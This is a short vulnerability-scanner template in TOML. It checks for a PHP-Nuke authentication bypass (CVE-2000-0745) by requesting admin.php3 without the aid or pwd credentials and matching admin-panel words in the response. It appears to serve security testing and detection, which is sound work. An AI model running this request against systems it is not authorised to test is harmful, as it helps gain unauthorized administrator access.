[info]
author = "ave"
description = "通过直接请求 admin.php3 且不提供 aid 或 pwd 参数，验证是否存在身份验证绕过漏洞以获取管理员权限。"
id = "POC-AVE-2000-0575"
name = "PHP-Nuke Administrative Privileges Bypass PoC"
severity = "high"
tags = ["ave-2000-0575"]
vuln_id = [
    "CVE-2000-0745",
    "AVE-2000-0575",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin.php3"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Admin Control Panel",
    "Administrator",
]
